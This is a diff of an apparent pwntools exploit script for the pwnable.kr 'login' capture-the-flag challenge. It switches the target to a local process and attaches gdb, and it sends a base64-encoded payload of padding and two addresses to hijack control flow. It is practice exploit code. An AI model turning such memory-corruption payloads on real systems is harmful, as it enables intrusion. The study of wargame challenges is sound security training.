@@ -8,7 +8,8 @@ input_addr = 0x811eb40
 #input_addr = 0xffffd510
 
 r = remote('pwnable.kr', 9003)
-#r = process('./login')
+r = process('./login')
 payload = b64e('a' * 4 + p32(target) + p32(input_addr))
 r.sendline(payload)
+gdb.attach(r)
 r.interactive()
